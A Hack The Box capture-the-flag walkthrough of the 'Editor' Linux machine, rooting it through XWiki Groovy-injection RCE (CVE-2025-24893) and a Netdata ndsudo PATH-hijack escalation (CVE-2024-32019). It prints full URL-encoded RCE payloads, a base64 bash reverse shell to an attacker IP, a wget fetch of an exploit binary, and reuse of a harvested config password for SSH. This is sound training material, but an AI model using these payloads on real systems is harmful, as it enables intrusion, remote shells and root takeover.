---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Editor Machine Walk-through

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the Era machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### Machine Info <a href="#bc0a" id="bc0a"></a>

* **Machine Name:** Editor
* **Machine OS:** Linux
* **Difficulty:** Easy
* Machine Link: \[[https://app.hackthebox.com/machines/Editor](https://app.hackthebox.com/machines/Editor)]

### Initial Scanning: <a href="#id-7163" id="id-7163"></a>

```bash
nmap -sV -T4 10.10.11.80
                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 16:53 IST
Nmap scan report for wiki.editor.htb (10.10.11.80)
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.91 seconds
```

We can see that port 80 and 8080 is open. and also see that the domain name is `wiki.editor.htb`.

Now we add the `editor.htb` and `wiki.editor.htb` to our `/etc/hosts` file:

```wasm
sudo echo "10.10.11.80 editor.htb wiki.editor.htb" | sudo tee -a /etc/hosts
```

Now we try to enumerate the port 8080 and here we can see that a web server running called xwiki.

> _xwiki:_\
> &#xNAN;_&#x58;Wiki is an open-source enterprise wiki and knowledge management platform written in Java. It allows users to collaborate on content, documents, and structured data using a web interface. XWiki can also be used as a web development platform for building custom applications._

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*EYi4IkZgQv0uCaeQCUYFhA.png" alt="" height="328" width="700"><figcaption></figcaption></figure>

Scroll down and see that the version of the web server is: `XWiki Debian 15.10.8`. So, we can try to search if any vulnerability or exploitation in google and we found a blog post and CVE-2025-24893.

CVE-2025–24893 — A critical remote code execution (RCE) vulnerability affecting the XWiki Platform.

> _Check the Blog post here: \[_[_https://www.ionix.io/blog/xwiki-remote-code-execution-vulnerability-cve-2025-24893/_](https://www.ionix.io/blog/xwiki-remote-code-execution-vulnerability-cve-2025-24893/)_]_

By following the Blog we can see The vulnerable endpoint:

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=<payload>
```

By injecting malicious Groovy code, an attacker can gain unauthorized access. Here’s an example of a proof-of-concept (PoC) exploit:

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("Exploit Successful! Result: " + (23 + 19)){{/groovy}}{{/async}}
```

If the system is vulnerable, it will return: Exploit Successful! Result: 42

This confirms that remote code execution (RCE) is possible. Attackers can replace the Groovy payload with more malicious commands, such as fetching malware, establishing backdoors, or exfiltrating sensitive data.

we can enter this hole URL in our web browser but we get an error.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*8W4w86RS-SwRbf_xVthnOg.png" alt="" height="322" width="700"><figcaption></figcaption></figure>

After many research we try to search this but useing URL Encoding format

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22Exploit%20Successful!%20Result%3A%20%22%20%2B%20(23%20%2B%2019))%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Hxboq8vMJuuuGZvw6iBpuA.png" alt="" height="320" width="700"><figcaption></figcaption></figure>

Now we try to read the file and after carefully analysis we can see this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*DSpGLdoaBZxhu-ZBwV1fEQ.png" alt="" height="102" width="700"><figcaption></figcaption></figure>

Means our payload was successfully exploited in server side. now we try to change the payload to get reverse shell connection.

Now we generate reverse shell payload.\
payload structure:

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}"bash -c {echo,<base64-revshell>}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}
```

Reverse shell Payload:

```bash
bash -i >& /dev/tcp/10.10.14.78/5858 0>&1
```

Convert this payload on Base64-Encoding:

```bash
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC81ODU4IDA+JjEn
```

Actual payload:

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}"bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC81ODU4IDA+JjEn}|{base64,-d}|{bash,-i}".execute(){{/groovy}}{{/async}}
```

Convert this payload in URL Encoding (Final Payload or URL):

```bash
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D
%22bash%20-c%20%7Becho%2CYmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43OC81ODU4IDA%2BJjEn%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D
%22.execute()%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

Our payload is ready. Now before uploading the payload we first need to start `Netcat` Listener and then upload the payload or URL in Browser.

```bash
nc -lnvp 5858
```

Now we sucssessfully get Reverse Shell Connection:

<figure><img src="https://miro.medium.com/v2/resize:fit:688/1*U3OoQwwdIbtkmy8KjFma-g.png" alt="" height="203" width="688"><figcaption></figcaption></figure>

Now observe that we get xwiki user and the user don’t have any shell or user directory. Means this user is not a valid user, may be this is a container.

<figure><img src="https://miro.medium.com/v2/resize:fit:684/1*71L2v9ixiCLxrHqfyHjHKg.png" alt="" height="456" width="684"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:670/1*V-TCYGi4jXgvqW6_IVNrhA.png" alt="" height="174" width="670"><figcaption></figcaption></figure>

Notice that thier are another user called `oliver`. May be that user is a actual user. So, we want to `oliver` user shell to get User flag. Now try to enumerate the system to get Oliver user shell.

After many reseach and analysis we found a password from `/etc/xwiki/hibernate.cfg.xml` file.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*R-IpCa6P-HySddLC71nP0Q.png" alt="" height="125" width="700"><figcaption></figcaption></figure>

Now try to connect Oliver user by using ssh with the help of preveously founded password.

```bash
ssh oliver@editor.htb
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*escGIZi9o1ULGfbJ2Qo0lw.png" alt="" height="388" width="700"><figcaption></figcaption></figure>

And we sucssessfully get ssh connection with Oliver user and also get User flag. 🎉

Our next challenge is to get root flag. So, after many research and analysis we can see by observing `/opt/` directory that their a security service is running called Netdata.

> _Netdata is a real-time monitoring and troubleshooting tool for systems, applications, containers, and cloud infrastructures. It’s designed to help system administrators, developers, and DevOps engineers monitor performance metrics with minimal system overhead._

And inside `/opt/netdata/netdata-plugins/plugins.d` directory we can see `ndsudo` has SUID bit set. Observe that the group permission of `ndsudo` and Oliver have same group `netdata`. Means we have permission to execute the command `ndsudo`.

<figure><img src="https://miro.medium.com/v2/resize:fit:605/1*y_XZL9Weas4tdimlm0ktzw.png" alt="" height="77" width="605"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*VgKIgOSFz_WFclSZxKi6SQ.png" alt="" height="60" width="700"><figcaption></figcaption></figure>

After many research in google we found CVE-2024–32019, which provide detial this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*6SSJ0QkvCOBTJ3Mkx2yhXw.png" alt="" height="343" width="700"><figcaption></figcaption></figure>

> _Link — \[_[_https://nvd.nist.gov/vuln/detail/CVE-2024-32019_](https://nvd.nist.gov/vuln/detail/CVE-2024-32019)_]_

Now try to exploit this vulnerability.

We can also found a PoC: \[[https://github.com/AzureADTrent/CVE-2024-32019-POC/tree/main](https://github.com/AzureADTrent/CVE-2024-32019-POC/tree/main)]

Now we can try to exploit a vulnerable `ndsudo` utility bundled with Netdata to escalate local privileges to root. The exploit works by injecting a malicious binary into the user’s `PATH` that impersonates a trusted command (`nvme`) and is executed with root privileges by `ndsudo`.

#### Prerequisites & Assumptions <a href="#ae4b" id="ae4b"></a>

* You have local shell access on the target system.
* You can execute the following command but it fails with a “not found” or similar error:

```bash
./ndsudo nvme-list
```

By the following Prerequisites we have Oliver user and also have permission to execute the command.

<figure><img src="https://miro.medium.com/v2/resize:fit:633/1*SJu4PVOtV-WF9J77o6azHQ.png" alt="" height="55" width="633"><figcaption></figcaption></figure>

Now download the poc.c from \[[https://github.com/AzureADTrent/CVE-2024-32019-POC/tree/main](https://github.com/AzureADTrent/CVE-2024-32019-POC/tree/main)] github repo. and Compile the Malicious Payload in our machine:

```bash
gcc poc.c -o nvme
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*_tAP3_7wbKjuu4QFN7bIDw.png" alt="" height="92" width="700"><figcaption></figcaption></figure>

This binary should be crafted to spawn a root shell or execute arbitrary commands with root privileges.

Now Move or upload the compiled `nvme` binary to a directory writable by target user, such as `/tmp`:

So we run python server in our machine to upload the file. (you can use any file upload method you have.)

```bash
python3 -m http.server 80
```

<figure><img src="https://miro.medium.com/v2/resize:fit:467/1*-TcRFOu83r_r00B-QRclsg.png" alt="" height="108" width="467"><figcaption></figcaption></figure>

And then run the following command on remote machine to download the binary file.

```bash
cd /tmp
wget http://10.10.14.78:80/nmve
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*yEOT4DdYsM8Ogz8VPjJWqQ.png" alt="" height="103" width="700"><figcaption></figcaption></figure>

Run the following commands to Prepare the Payload for Execution:

```bash
chmod +x /tmp/nvme
export PATH=/tmp:$PATH
```

<figure><img src="https://miro.medium.com/v2/resize:fit:463/1*S1aSXMopqg3FICdJZUjRQw.png" alt="" height="45" width="463"><figcaption></figcaption></figure>

This ensures `ndsudo` will resolve and execute your malicious `nvme` instead of the legitimate one.

Now go to `/opt/netdata/netdata-plugins/plugins.d` directory and Run the vulnerable command to trigger `ndsudo`:

```bash
cd /opt/netdata/netdata-plugins/plugins.d
./ndsudo nvme-list
```

And Boommm! 💥 we get root shell and root flag as well. 🎉

<figure><img src="https://miro.medium.com/v2/resize:fit:645/1*CdXcZFd5hutGXcB-fH09OQ.png" alt="" height="98" width="645"><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

### Follow me on below Social Media: <a href="#id-582d" id="id-582d"></a>

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
